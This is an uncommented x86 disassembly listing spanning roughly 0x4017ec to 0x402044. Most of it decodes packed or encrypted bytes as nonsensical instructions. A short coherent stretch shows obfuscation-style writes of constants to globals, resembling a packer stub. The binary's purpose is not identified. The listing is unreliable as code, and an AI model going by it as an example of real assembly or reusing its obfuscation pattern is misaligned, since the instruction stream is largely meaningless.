  4017ec:	popa   
  4017ed:	leave  
  4017ee:	call   0xf52a:0x96adeba6
  4017f5:	cwde   
  4017f6:	dec    edi
  4017f7:	pop    eax
  4017f8:	clc    
  4017f9:	leave  
  4017fa:	dec    eax
  4017fb:	mov    edx,0x2b31126f
  401800:	and    BYTE PTR [edx-0x19],dh
  401803:	sahf   
  401804:	pusha  
  401805:	xchg   edx,eax
  401806:	sbb    eax,0x8767a59
  40180b:	aam    0x98
  40180d:	adc    al,BYTE PTR [ecx]
  40180f:	and    ecx,DWORD PTR [eax]
  401811:	xor    BYTE PTR [ebx],dh
  401813:	outs   dx,BYTE PTR ds:[esi]
  401814:	pop    es
  401815:	das    
  401816:	add    al,0xc2
  401818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401819:	mov    dh,0x9c
  40181b:	pop    ebx
  40181c:	pop    esi
  40181d:	inc    ecx
  40181e:	mov    al,ds:0x345aeab
  401823:	fld    TBYTE PTR [edi+0x49c0a70f]
  401829:	mov    dl,0x5d
  40182b:	pop    ds
  40182c:	mov    esi,0x28d60136
  401831:	(bad)  
  401832:	sar    BYTE PTR [esi+0x22445e81],1
  401838:	jae    0x401800
  40183a:	mov    WORD PTR [edi+eax*1-0x5226c26],ss
  401841:	add    eax,eax
  401843:	push   ebx
  401844:	xchg   edx,eax
  401845:	inc    ecx
  401846:	loopne 0x40183f
  401848:	add    esi,DWORD PTR cs:[ebx]
  40184b:	pop    ebx
  40184c:	xor    esp,DWORD PTR [ecx]
  40184e:	iret   
  40184f:	pusha  
  401850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401851:	in     al,0xa9
  401853:	dec    esp
  401854:	add    esi,0x5338ee1b
  40185a:	lods   eax,DWORD PTR ds:[esi]
  40185b:	int3   
  40185c:	(bad)
  401860:	pop    es
  401861:	and    cl,al
  401863:	and    ebp,DWORD PTR [ecx+0x39]
  401866:	out    dx,al
  401867:	sub    esp,ebx
  401869:	add    eax,0xda71f0a2
  40186e:	mov    edx,0x971a7b5d
  401873:	jb     0x401881
  401875:	adc    eax,0x2614eb3d
  40187a:	not    ah
  40187c:	sub    eax,0xa63cc180
  401881:	adc    bh,BYTE PTR [ebx-0x1e1cf329]
  401887:	add    ah,bl
  401889:	inc    esi
  40188a:	cmp    bh,ch
  40188c:	xor    DWORD PTR [ebp-0x5fde4f54],0x33
  401893:	(bad)  
  401895:	enter  0xf89a,0x85
  401899:	aad    0x48
  40189b:	pop    esp
  40189c:	adc    al,0xe5
  40189e:	in     eax,dx
  40189f:	cdq    
  4018a0:	call   0x408aa921
  4018a5:	dec    esp
  4018a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018a7:	fimul  DWORD PTR [ecx]
  4018a9:	lds    ebp,FWORD PTR [esi+0x69]
  4018ac:	jmp    0x4018a2
  4018ae:	clc    
  4018af:	loope  0x40191a
  4018b1:	int    0x61
  4018b3:	mov    cl,0x41
  4018b5:	test   BYTE PTR [esi-0x62],0x88
  4018b9:	mov    al,ds:0xf84a64b4
  4018be:	xor    eax,ebx
  4018c0:	cwde   
  4018c1:	out    dx,eax
  4018c2:	xor    DWORD PTR [edx+eax*4+0x7b],edi
  4018c6:	aam    0x37
  4018c8:	cwde   
  4018c9:	ficom  WORD PTR [ebp-0x2a]
  4018cc:	neg    ah
  4018ce:	stos   DWORD PTR es:[edi],eax
  4018cf:	test   DWORD PTR [edi],edx
  4018d1:	adc    al,BYTE PTR [edx*1-0x48053da9]
  4018d8:	lods   al,BYTE PTR ds:[esi]
  4018d9:	test   BYTE PTR [ecx+eiz*8+0x2c2a708e],ch
  4018e0:	jl     0x40191c
  4018e2:	sbb    BYTE PTR [esi],ch
  4018e4:	or     edx,DWORD PTR [ebx-0x53f3ce57]
  4018ea:	fbstp  TBYTE PTR [eax-0x12]
  4018ed:	sub    eax,0x79b869f1
  4018f2:	xor    eax,0x13727a6a
  4018f7:	popa   
  4018f8:	push   eax
  4018f9:	sar    eax,0x34
  4018fc:	ss jmp 0x1f97:0x14b14db9
  401904:	lods   eax,DWORD PTR ds:[esi]
  401905:	sub    eax,0x5402d8d0
  40190a:	test   al,0xab
  40190c:	loop   0x401924
  40190e:	bound  esp,QWORD PTR [ebx+0x6]
  401911:	sti    
  401912:	xchg   eax,ebx
  401914:	bound  ecx,QWORD PTR [ecx-0x22e11cf8]
  40191a:	hlt    
  40191b:	cld    
  40191c:	dec    eax
  40191d:	scas   al,BYTE PTR es:[edi]
  40191e:	retf   0xbb93
  401921:	jae    0x4018b3
  401923:	xor    edx,esp
  401925:	out    0x87,al
  401927:	mov    ds:0xc8f71af3,eax
  40192c:	push   ds
  40192d:	clc    
  40192e:	jp     0x4018f3
  401930:	out    dx,eax
  401931:	jb     0x401977
  401933:	xor    esp,DWORD PTR [esi+esi*8]
  401936:	adc    ebx,DWORD PTR [ebp+0x4b]
  401939:	vpsubusw xmm3,xmm1,XMMWORD PTR [ecx+0x14f7026c]
  401941:	je     0x401919
  401943:	inc    edi
  401944:	int3   
  401945:	fs aad 0xec
  401948:	mov    eax,0x78ae0595
  40194d:	pop    ds
  40194e:	stos   BYTE PTR es:[edi],al
  40194f:	sub    DWORD PTR [ebp-0x53],0x37dde05a
  401956:	iret   
  401957:	dec    edi
  401958:	lods   al,BYTE PTR ds:[si]
  40195a:	push   esp
  40195b:	xlat   BYTE PTR ds:[ebx]
  40195c:	ss jp  0x401922
  40195f:	pushf  
  401960:	sbb    esp,eax
  401962:	xor    bh,BYTE PTR [ebx]
  401964:	pop    ecx
  401965:	adc    ch,ch
  401967:	inc    dh
  401969:	push   cs
  40196a:	cli    
  40196b:	out    dx,eax
  40196c:	hlt    
  40196d:	and    al,0x69
  40196f:	sbb    BYTE PTR [eax-0x2],0xf8
  401973:	or     dl,BYTE PTR [ecx+edi*4-0x66]
  401977:	mov    WORD PTR [ecx+0x285ee1d],ss
  40197d:	fcmovne st,st(2)
  40197f:	lods   eax,DWORD PTR ds:[esi]
  401980:	xchg   esi,eax
  401981:	cs push 0x6d425526
  401987:	gs pusha 
  401989:	clc    
  40198a:	inc    esi
  40198b:	push   ebx
  40198c:	jmp    0x4953:0x92b33138
  401993:	sbb    BYTE PTR [esi-0x3f840376],bl
  401999:	inc    eax
  40199a:	lods   eax,DWORD PTR ds:[esi]
  40199b:	xlat   BYTE PTR ds:[ebx]
  40199c:	sti    
  40199d:	xchg   edi,eax
  40199e:	les    edx,FWORD PTR [ecx]
  4019a0:	push   ebp
  4019a1:	lea    ecx,[edx]
  4019a3:	clc    
  4019a4:	aaa    
  4019a5:	xor    ecx,DWORD PTR [ebp-0x60]
  4019a8:	add    al,0x14
  4019aa:	push   esp
  4019ab:	cmp    BYTE PTR [edi],dl
  4019ad:	popa   
  4019ae:	xor    eax,0xe2d424ba
  4019b3:	lock mov dh,0xd1
  4019b6:	mov    ecx,0x920ef261
  4019bb:	mov    bh,0x0
  4019bd:	sub    eax,0x39eebda7
  4019c2:	imul   ebx,DWORD PTR [ebx+edi*1+0xc],0x1
  4019c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019c8:	cmp    BYTE PTR [ebp-0x6b40ec2b],dl
  4019ce:	push   eax
  4019cf:	push   edx
  4019d0:	test   al,0x1a
  4019d2:	out    0xc1,al
  4019d4:	(bad)  
  4019d5:	out    dx,al
  4019d6:	pop    sp
  4019d8:	push   ecx
  4019d9:	call   0x5a2fcd27
  4019de:	xor    DWORD PTR [bx+di+0x73],ecx
  4019e2:	push   ebp
  4019e3:	sub    DWORD PTR [eax+0x3f4fc077],edx
  4019e9:	mov    dh,0x7a
  4019eb:	inc    edx
  4019ec:	xchg   esp,eax
  4019ed:	enter  0x7aee,0xc5
  4019f1:	(bad)  
  4019f2:	mov    edi,0xcd47eaf3
  4019f7:	sbb    edx,DWORD PTR [esi]
  4019f9:	lock pop esi
  4019fb:	out    0x2c,al
  4019fd:	ss (bad) 
  4019ff:	dec    esp
  401a00:	scas   eax,DWORD PTR es:[edi]
  401a01:	adc    BYTE PTR [ebp+0x2149e40c],0x67
  401a08:	jae    0x401a43
  401a0a:	xor    edx,DWORD PTR [esi-0x39573f9]
  401a10:	das    
  401a11:	stos   DWORD PTR es:[edi],eax
  401a12:	leave  
  401a13:	popf   
  401a14:	mov    dh,0x37
  401a16:	dec    ecx
  401a17:	push   esi
  401a18:	push   cs
  401a19:	mov    al,0x39
  401a1b:	out    0xd,eax
  401a1d:	jne    0x401a4c
  401a1f:	sub    eax,DWORD PTR [edx-0x1a]
  401a22:	retf   0x7250
  401a25:	push   ebx
  401a26:	es add DWORD PTR gs:[esi],ecx
  401a2a:	adc    esi,ecx
  401a2c:	jmp    0x401a2d
  401a2e:	add    DWORD PTR ds:0xcbba4b1c,0x52
  401a35:	add    DWORD PTR [ecx],eax
  401a37:	aaa    
  401a38:	popf   
  401a39:	and    BYTE PTR fs:[edi+0x6b],ah
  401a3d:	cld    
  401a3e:	mov    cl,0xfe
  401a40:	sbb    BYTE PTR [ecx-0x43],0xd9
  401a44:	mov    ecx,0x51820692
  401a49:	inc    edx
  401a4a:	shr    DWORD PTR [edi+0x4f872e50],cl
  401a50:	inc    esi
  401a51:	or     eax,0x4e0c05ce
  401a56:	dec    ecx
  401a57:	(bad)  
  401a58:	xchg   ebp,eax
  401a59:	pusha  
  401a5a:	pop    edx
  401a5b:	dec    eax
  401a5c:	int    0x34
  401a5e:	lea    eax,[edi]
  401a60:	stc    
  401a61:	inc    ecx
  401a62:	sbb    ch,BYTE PTR [eax+0x19]
  401a65:	cwde   
  401a66:	stos   BYTE PTR es:[edi],al
  401a67:	out    dx,eax
  401a68:	lods   eax,DWORD PTR ds:[esi]
  401a69:	fst    QWORD PTR [ebx]
  401a6b:	sub    ecx,DWORD PTR [eax+0x7]
  401a6e:	aaa    
  401a6f:	xor    al,0xee
  401a71:	mov    ah,0x19
  401a73:	pop    esp
  401a74:	imul   BYTE PTR [ecx+0x3e]
  401a77:	sbb    al,0x3e
  401a79:	clc    
  401a7a:	jp     0x401ae5
  401a7c:	into   
  401a7d:	mov    bh,0x52
  401a7f:	push   edx
  401a80:	pop    ss
  401a81:	call   0xe60ccea8
  401a86:	jecxz  0x401a9f
  401a88:	addr16 shl edi,1
  401a8b:	sub    ch,0x7e
  401a8e:	cwde   
  401a8f:	gs aas 
  401a91:	mov    esp,0x514b5d39
  401a96:	mov    esp,0x7782051d
  401a9b:	rcr    DWORD PTR [eax+0x1],cl
  401a9e:	xchg   BYTE PTR [edx-0x35],dh
  401aa1:	add    eax,0x74335c46
  401aa6:	sub    ch,al
  401aa8:	push   ds
  401aa9:	push   edi
  401aaa:	outs   dx,DWORD PTR ds:[esi]
  401aab:	or     eax,0xd19fe7a0
  401ab0:	lock push esp
  401ab2:	into   
  401ab3:	(bad)  
  401ab4:	std    
  401ab5:	mov    BYTE PTR [edx-0x49],ah
  401ab8:	jp     0x401aa8
  401aba:	adc    edi,ebx
  401abc:	xor    DWORD PTR [ebx-0x2b339998],ebx
  401ac2:	fsub   DWORD PTR [edx+0xb454393]
  401ac8:	cli    
  401ac9:	stc    
  401aca:	xor    eax,0x3d0ad7ab
  401acf:	jbe    0x401b01
  401ad1:	pop    esi
  401ad2:	xchg   edi,eax
  401ad3:	xchg   edx,eax
  401ad4:	lahf   
  401ad5:	sbb    edi,0xf581b49f
  401adb:	push   0x43
  401add:	mov    eax,ds:0xb3960c4f
  401ae2:	inc    ebp
  401ae3:	std    
  401ae4:	lods   eax,DWORD PTR ds:[esi]
  401ae5:	or     BYTE PTR [ecx+0x3e1b6820],ah
  401aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aec:	clc    
  401aed:	clc    
  401aee:	sub    bl,BYTE PTR [ebx]
  401af0:	mov    dl,ch
  401af2:	mov    eax,ds:0x5b273524
  401af7:	fs and al,0x42
  401afa:	(bad)  
  401afb:	dec    eax
  401afc:	cld    
  401afd:	scas   al,BYTE PTR es:[edi]
  401afe:	out    dx,eax
  401aff:	jns    0x401af9
  401b01:	push   ecx
  401b02:	outs   dx,BYTE PTR ds:[esi]
  401b03:	cwde   
  401b04:	mov    ch,0xf6
  401b06:	out    0x4a,eax
  401b08:	call   0x30f4746d
  401b0d:	mov    dh,0x44
  401b0f:	jns    0x401ac8
  401b11:	mov    WORD PTR [esi+esi*4],gs
  401b14:	adc    ch,al
  401b16:	icebp  
  401b17:	gs sub eax,0xbc396d92
  401b1d:	nop
  401b1e:	(bad)  
  401b20:	jp     0x401b8b
  401b22:	(bad)  
  401b23:	js     0x401b7d
  401b25:	imul   edi,DWORD PTR ds:0xa0d900d,0x2e7418f4
  401b2f:	xor    BYTE PTR [esi-0x1c2f986],bh
  401b35:	jmp    esi
  401b37:	enter  0xe513,0xff
  401b3b:	inc    edi
  401b3c:	mov    esp,0xf2e5342
  401b41:	xchg   edx,eax
  401b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b43:	mov    eax,0x5999d50d
  401b48:	rol    esp,0xc9
  401b4b:	xchg   DWORD PTR [eax],eax
  401b4d:	(bad)  
  401b4e:	fcom   QWORD PTR [esi-0x724dcc1a]
  401b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b55:	into   
  401b56:	sahf   
  401b57:	push   0xd7436d91
  401b5c:	mov    al,BYTE PTR [eax-0x12]
  401b5f:	pop    ss
  401b60:	push   cs
  401b61:	cdq    
  401b62:	ins    DWORD PTR es:[edi],dx
  401b63:	test   DWORD PTR [eax-0x472e2a4b],edi
  401b69:	daa    
  401b6a:	mov    bh,0xc1
  401b6c:	push   cs
  401b6d:	gs xchg edi,eax
  401b6f:	int    0x23
  401b71:	adc    al,0x9f
  401b73:	lods   eax,DWORD PTR ds:[esi]
  401b74:	and    BYTE PTR [edi-0x583e35a3],bh
  401b7a:	imul   ebx,DWORD PTR [ecx+0x5f16c324],0x9babec73
  401b84:	fld    QWORD PTR ds:0xc2a554d
  401b8a:	das    
  401b8b:	cdq    
  401b8c:	jo     0x401b37
  401b8e:	test   al,0xc
  401b90:	sbb    DWORD PTR [ecx],esp
  401b92:	push   ss
  401b93:	push   eax
  401b94:	mov    esi,0x11588449
  401b99:	fsub   st(1),st
  401b9b:	and    bh,cl
  401b9d:	test   al,0x10
  401b9f:	mov    al,ds:0xd8254fb3
  401ba4:	xchg   esp,eax
  401ba5:	(bad)  
  401ba6:	cmc    
  401ba7:	mov    eax,ds:0x1078e172
  401bac:	nop
  401bad:	mov    esp,0x9bb6584f
  401bb2:	mov    esi,0x478bad2f
  401bb7:	sub    eax,0x8bb058f4
  401bbd:	fimul  DWORD PTR [ecx+0x9435623]
  401bc3:	clc    
  401bc4:	cmp    eax,0x19f00886
  401bc9:	inc    esp
  401bca:	cmp    eax,0x39bad65
  401bcf:	push   esi
  401bd0:	imul   ecx,DWORD PTR [ecx+0x1906cf7c],0xffffff8b
  401bd7:	dec    ebp
  401bd8:	sbb    al,0xf
  401bda:	lods   al,BYTE PTR ds:[esi]
  401bdb:	enter  0xc102,0xe9
  401bdf:	add    dh,bh
  401be1:	ror    BYTE PTR [ebx-0x74b5e7b3],cl
  401be7:	push   ebp
  401be8:	sbb    al,0x33
  401bea:	mov    DWORD PTR [ecx+0x42297e15],0x4229a200
  401bf4:	add    BYTE PTR [ebx],dh
  401bf6:	rol    bh,cl
  401bf8:	add    eax,0x4229ae
  401bfd:	mov    bl,0x6b
  401bff:	add    BYTE PTR [eax],al
  401c01:	or     edx,eax
  401c03:	adc    DWORD PTR ds:0x422986,0x42289e
  401c0d:	mov    DWORD PTR [ebp-0x3c],edx
  401c10:	neg    eax
  401c12:	mov    DWORD PTR [ebp-0x70],0x2c55
  401c19:	mov    DWORD PTR [ebp-0x6c],0x456f
  401c20:	cmp    DWORD PTR ds:0x4229d2,0x0
  401c27:	mov    DWORD PTR ds:0x42289e,0x7b64
  401c31:	mov    DWORD PTR ds:0x42292a,0x2f7e
  401c3b:	mov    DWORD PTR ds:0x42289a,0x21f
  401c45:	mov    DWORD PTR ds:0x4229ce,0x3163
  401c4f:	jmp    0x401cb0
  401c54:	mov    DWORD PTR ds:0x4228ae,0x1734
  401c5e:	mov    eax,0x7b34
  401c63:	je     0x401c91
  401c69:	push   0x771c
  401c6e:	push   DWORD PTR [ebp-0x18]
  401c71:	call   DWORD PTR ds:0x42a040
  401c77:	and    DWORD PTR ds:0x422996,0x7212
  401c81:	sub    DWORD PTR ds:0x42297e,0x15ec
  401c8b:	and    DWORD PTR ds:0x42290e,ebx
  401c91:	or     DWORD PTR ds:0x42298a,0x1787
  401c9b:	xor    DWORD PTR ds:0x4229aa,0x7558
  401ca5:	mov    eax,ds:0x4228f6
  401caa:	sub    DWORD PTR ds:0x4228fa,eax
  401cb0:	mov    DWORD PTR [ebp-0x70],0x78a6
  401cb7:	movzx  eax,BYTE PTR ds:0x4229a2
  401cbe:	or     DWORD PTR ds:0x4228fe,eax
  401cc4:	jmp    0x40224e
  401cc9:	in     eax,dx
  401cca:	in     al,dx
  401ccb:	test   DWORD PTR [edi+esi*8-0x219a9b7c],0x1a6e8adf
  401cd6:	xlat   BYTE PTR ds:[ebx]
  401cd7:	data16 outs dx,BYTE PTR ds:[esi]
  401cd9:	push   0xfffffffa
  401cdb:	push   ss
  401cdc:	push   ss
  401cdd:	cmp    eax,0x23161604
  401ce2:	aad    0x3
  401ce4:	ss xor al,0xd
  401ce7:	sub    al,BYTE PTR [eax+0x8]
  401cea:	fidivr WORD PTR [ebp*8+0x1a36a143]
  401cf1:	hlt    
  401cf2:	sub    ecx,DWORD PTR [eax+0x287a01f]
  401cf8:	push   esi
  401cf9:	stos   DWORD PTR es:[edi],eax
  401cfa:	int3   
  401cfb:	repz (bad) 
  401cfd:	sub    eax,0x265c7ce8
  401d02:	xchg   esi,eax
  401d03:	mov    bl,0xfc
  401d05:	arpl   dx,bp
  401d07:	sar    ebx,1
  401d09:	xor    esp,ecx
  401d0b:	add    al,0x9f
  401d0d:	pusha  
  401d0e:	mov    al,0x6a
  401d10:	mov    ds:0x46848a4f,eax
  401d15:	mov    cl,0x7b
  401d17:	mov    ds:0xbbcedfb4,eax
  401d1c:	lock and eax,0x7fb49831
  401d22:	sub    ch,cl
  401d24:	mov    ah,0x83
  401d26:	mov    cl,0xb5
  401d28:	mov    eax,ds:0x939f4fef
  401d2d:	jae    0x401d2c
  401d2f:	cmp    DWORD PTR [ebx+0x624933d5],esi
  401d35:	dec    esi
  401d36:	mov    ds:0x3e992cd6,eax
  401d3b:	hlt    
  401d3c:	cmp    bh,BYTE PTR [eax+0x20]
  401d3f:	call   0x22c748d0
  401d44:	push   ecx
  401d45:	int    0xaf
  401d47:	mov    ch,0x7e
  401d49:	addr16 cs fs in al,0x11
  401d4e:	inc    ecx
  401d4f:	cmp    DWORD PTR [ebp-0x1d2d14b1],0xfffffffd
  401d56:	gs fwait
  401d58:	icebp  
  401d59:	imul   esp,DWORD PTR [edx],0xffffffb9
  401d5c:	xchg   edx,eax
  401d5d:	aas    
  401d5e:	pop    edi
  401d5f:	add    DWORD PTR ds:0x29d2532e,ecx
  401d65:	sbb    eax,0xf1c648a2
  401d6a:	fcmovbe st,st(7)
  401d6c:	out    0x9,al
  401d6e:	adc    al,0xa0
  401d70:	push   cs
  401d71:	mov    cl,BYTE PTR [ebp-0x13]
  401d74:	push   esi
  401d75:	or     DWORD PTR [edx],ecx
  401d77:	cmc    
  401d78:	mov    bh,0x95
  401d7a:	xor    dh,0x2c
  401d7d:	mov    bl,0x4c
  401d7f:	sub    DWORD PTR [ecx+edx*2],0x57
  401d83:	inc    esp
  401d84:	std    
  401d85:	cmc    
  401d86:	cmp    bl,BYTE PTR [ebp-0x47c0f2c0]
  401d8c:	push   0x3
  401d8e:	cmp    ebp,DWORD PTR fs:[eax-0x4e]
  401d92:	and    al,0xb6
  401d94:	test   al,0x26
  401d96:	aad    0xc0
  401d98:	xor    DWORD PTR [ebp+0x7e],edi
  401d9b:	das    
  401d9c:	pop    ds
  401d9d:	fwait
  401d9e:	jmp    0xde1b:0x385ebfe1
  401da5:	dec    ebx
  401da6:	mov    ch,0x6b
  401da8:	push   ecx
  401da9:	mov    DWORD PTR [esi+0x6f],eax
  401dac:	add    eax,edi
  401dae:	pop    esi
  401daf:	cmp    DWORD PTR [ebx+esi*2],esp
  401db2:	xchg   edx,eax
  401db3:	sub    eax,0x2948b112
  401db8:	adc    eax,0x615870fa
  401dbd:	xor    DWORD PTR [ecx+eax*1+0x7f],ebx
  401dc1:	inc    edi
  401dc2:	enter  0x8e56,0x7a
  401dc6:	pusha  
  401dc7:	retf   
  401dc8:	jmp    0x401d64
  401dca:	ds inc ecx
  401dcc:	mov    eax,ds:0xa0f271d5
  401dd1:	xchg   DWORD PTR [edi],edi
  401dd3:	pop    ebp
  401dd4:	call   0x2f93b683
  401dd9:	mov    WORD PTR [bp+si],gs
  401ddc:	fwait
  401ddd:	or     ebp,DWORD PTR [ebx]
  401ddf:	les    esp,FWORD PTR [edx+0x6c]
  401de2:	mov    bl,0x6d
  401de4:	sbb    al,0x56
  401de6:	dec    esi
  401de7:	icebp  
  401de8:	popf   
  401de9:	push   cs
  401dea:	lea    ecx,[ebx-0x72b87f59]
  401df0:	retf   0x1511
  401df3:	xchg   ecx,eax
  401df4:	push   cs
  401df5:	rol    BYTE PTR [esi-0x7a],cl
  401df8:	push   ecx
  401df9:	scas   eax,DWORD PTR es:[edi]
  401dfa:	pop    esp
  401dfb:	jp     0x401e32
  401dfd:	hlt    
  401dfe:	mov    dl,0x5f
  401e00:	add    esi,edx
  401e02:	adc    eax,0x3cb8a2ca
  401e07:	and    dl,dh
  401e09:	push   eax
  401e0a:	mov    dh,0x51
  401e0c:	cmp    al,0x63
  401e0e:	jbe    0x401dde
  401e10:	mov    WORD PTR [eax-0x6459749f],es
  401e16:	test   al,0x8b
  401e18:	int    0xd0
  401e1a:	and    esp,DWORD PTR [ecx-0x13684132]
  401e20:	inc    edi
  401e21:	outs   dx,BYTE PTR ds:[esi]
  401e22:	pop    esp
  401e23:	cmc    
  401e24:	enter  0x294d,0x38
  401e28:	rol    BYTE PTR [ecx],0x4e
  401e2b:	shl    BYTE PTR [esi],cl
  401e2d:	or     dl,BYTE PTR [ecx+0x5ba8b80]
  401e33:	dec    eax
  401e34:	dec    edi
  401e35:	push   eax
  401e36:	or     ecx,DWORD PTR [edi]
  401e38:	jae    0x401dfa
  401e3a:	add    esi,DWORD PTR [ebx]
  401e3c:	inc    eax
  401e3d:	push   ecx
  401e3e:	lods   al,BYTE PTR ds:[esi]
  401e3f:	(bad)  
  401e40:	ins    DWORD PTR es:[edi],dx
  401e41:	sub    DWORD PTR [edi+0x1409cbbf],esp
  401e47:	xor    eax,0xc13b3e95
  401e4c:	call   0xf1facc1b
  401e51:	dec    DWORD PTR ds:0xe1fcbf19
  401e57:	repnz clc 
  401e59:	push   0x55c5ecc0
  401e5e:	outs   dx,DWORD PTR ds:[esi]
  401e5f:	adc    eax,0x44eba07f
  401e64:	mov    ds:0x21d8785e,al
  401e69:	mov    ecx,0xb57e6f2a
  401e6e:	push   cs
  401e6f:	mov    ds:0xade6a842,al
  401e74:	mov    ds:0xb5f68e1f,eax
  401e79:	lods   eax,DWORD PTR ds:[esi]
  401e7a:	pop    esi
  401e7b:	sub    bh,ah
  401e7d:	or     edi,DWORD PTR [edx+edx*2-0x253da6e6]
  401e84:	dec    ebp
  401e85:	mov    ebp,0x6eec770
  401e8a:	(bad)  
  401e8b:	std    
  401e8c:	in     eax,0x23
  401e8e:	mov    edi,0x8e5448ae
  401e93:	inc    edx
  401e94:	jmpw   0x3671
  401e98:	jno    0x401e39
  401e9a:	inc    eax
  401e9b:	ja     0x401e53
  401e9d:	jns    0x401edd
  401e9f:	add    edx,DWORD PTR [edx]
  401ea1:	repnz push 0xffffffbf
  401ea4:	aaa    
  401ea5:	and    BYTE PTR [ebx+0x233b1923],bh
  401eab:	enter  0x42a7,0xa7
  401eaf:	jno    0x401f0a
  401eb1:	mov    ch,0xf0
  401eb3:	jl     0x401f1b
  401eb5:	sub    bh,cl
  401eb7:	inc    edx
  401eb8:	xchg   edi,eax
  401eb9:	sub    DWORD PTR [esp+ebx*1-0x300b2b78],edi
  401ec0:	jno    0x401e6e
  401ec2:	mov    eax,ds:0x76d30117
  401ec7:	lahf   
  401ec8:	jo     0x401eb2
  401eca:	je     0x401e65
  401ecc:	shl    bl,cl
  401ece:	fcom   QWORD PTR [ebx-0x69eadb69]
  401ed4:	pop    eax
  401ed5:	xor    eax,0x81148abd
  401eda:	test   al,0x5
  401edc:	and    cl,BYTE PTR [ecx+0x2]
  401edf:	jb     0x401f58
  401ee1:	sar    edx,1
  401ee3:	aaa    
  401ee4:	xlat   BYTE PTR ds:[ebx]
  401ee5:	mov    esp,0xba9a9745
  401eea:	pop    ds
  401eeb:	loop   0x401e74
  401eed:	std    
  401eee:	push   es
  401eef:	rcl    ebx,0xaf
  401ef2:	or     ebx,DWORD PTR [eax]
  401ef4:	inc    edi
  401ef5:	cli    
  401ef6:	push   cs
  401ef7:	sbb    eax,0x68754b0e
  401efc:	daa    
  401efd:	fwait
  401efe:	fs mov dl,0x0
  401f01:	xchg   esi,eax
  401f02:	in     eax,dx
  401f03:	xor    dl,BYTE PTR ds:0xc3df3245
  401f09:	jle    0x401efe
  401f0b:	mov    fs,WORD PTR [esi+ebx*8-0x1d]
  401f0f:	inc    eax
  401f10:	loopne 0x401eb1
  401f12:	push   eax
  401f13:	call   0xd997:0x1f879aeb
  401f1a:	adc    DWORD PTR [eax+0x76c0c0db],ebx
  401f20:	sub    DWORD PTR [ebx],ebx
  401f22:	pop    es
  401f23:	cmc    
  401f24:	sub    BYTE PTR [ebp-0x37],bl
  401f27:	mov    dh,0xbb
  401f29:	add    edx,eax
  401f2b:	xor    BYTE PTR [ebx+0x28],dl
  401f2e:	aaa    
  401f2f:	cmp    bh,BYTE PTR [ebx-0x3e9a797f]
  401f35:	fwait
  401f36:	add    eax,0x303e54d2
  401f3b:	xchg   DWORD PTR [edi+eax*1-0x42],ecx
  401f3f:	pop    ecx
  401f40:	jb     0x401f9e
  401f42:	jge    0x401ec6
  401f44:	mov    BYTE PTR [ebx-0x440eda36],bh
  401f4a:	mov    eax,ds:0xd604af14
  401f4f:	add    al,0xa2
  401f51:	or     eax,0x96ca7dac
  401f56:	test   BYTE PTR ds:0x582bda96,ch
  401f5c:	shl    al,1
  401f5e:	iret   
  401f5f:	push   ecx
  401f60:	mov    ecx,0x50bde77
  401f65:	jbe    0x401f96
  401f67:	das    
  401f68:	imul   esp,ecx,0xffffffcd
  401f6b:	jae    0x401fea
  401f6d:	(bad)  
  401f6e:	jno    0x401f1f
  401f70:	iret   
  401f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f72:	imul   edi,DWORD PTR [ecx-0x4862f3dd],0xffffffa3
  401f79:	(bad)  
  401f7b:	stos   BYTE PTR es:[edi],al
  401f7c:	cli    
  401f7d:	aam    0x11
  401f7f:	jne    0x401f49
  401f81:	push   0x2f
  401f83:	push   ds
  401f84:	xor    edi,DWORD PTR [edx-0x49a1b3f5]
  401f8a:	les    ecx,FWORD PTR [ecx+0x46]
  401f8d:	(bad)  
  401f8e:	push   0x7128a76
  401f93:	fs popf 
  401f95:	cmp    esi,DWORD PTR [ebx+ebx*2]
  401f98:	repnz mov al,0x13
  401f9b:	in     al,0x85
  401f9d:	call   FWORD PTR [edx-0x526181e6]
  401fa3:	in     al,0x5d
  401fa5:	loope  0x401f76
  401fa7:	cmp    ch,BYTE PTR [ecx+0x32423713]
  401fad:	adc    eax,0x72072b41
  401fb2:	adc    al,0x84
  401fb4:	mov    esp,0x7800ad3e
  401fb9:	in     eax,dx
  401fba:	hlt    
  401fbb:	mov    ah,0xea
  401fbd:	fstp   DWORD PTR [esi]
  401fbf:	jge    0x402002
  401fc1:	cli    
  401fc2:	cmp    ebp,esi
  401fc4:	hlt    
  401fc5:	icebp  
  401fc6:	add    al,0xa5
  401fc8:	xor    al,0x9e
  401fca:	inc    eax
  401fcb:	cli    
  401fcc:	sub    al,0xb3
  401fce:	push   cs
  401fcf:	lahf   
  401fd0:	repnz icebp 
  401fd2:	fld    DWORD PTR [esi+0x28]
  401fd5:	mov    cl,BYTE PTR [edx-0x615db558]
  401fdb:	mov    dl,0x92
  401fdd:	xor    BYTE PTR [eax+eiz*2+0x16bf052c],al
  401fe4:	fwait
  401fe5:	retf   0x8c2f
  401fe8:	fimul  DWORD PTR [ebp-0x46d062a3]
  401fee:	dec    edx
  401fef:	cmp    BYTE PTR [ecx*1+0x4d860c0b],ch
  401ff6:	mov    bh,0x1c
  401ff8:	mov    BYTE PTR [edx+0x5fcd1acc],dl
  401ffe:	adc    esi,DWORD PTR [edx]
  402000:	dec    esp
  402001:	stos   DWORD PTR es:[edi],eax
  402002:	sbb    ebx,edx
  402004:	ret    0xfe11
  402007:	add    eax,0x63d3d325
  40200c:	(bad)  
  40200e:	jnp    0x402002
  402010:	mov    dl,0x10
  402012:	sbb    BYTE PTR [ebx],ch
  402014:	mov    edi,0x2f537696
  402019:	cmp    ecx,DWORD PTR [ecx-0xad0e25d]
  40201f:	sub    DWORD PTR [esi],0x3fd72a9e
  402025:	push   ebx
  402026:	inc    eax
  402027:	jmp    0x4c19:0xfe6d729e
  40202e:	xor    BYTE PTR [ecx-0x15aeb346],al
  402034:	out    0xca,al
  402036:	inc    BYTE PTR [esi+0x78]
  402039:	fild   WORD PTR [ebp+ebp*8-0x65397709]
  402040:	cmc    
  402041:	dec    esi
  402042:	mov    dh,0xe5
  402044:	fcomp  DWORD PTR [esi]
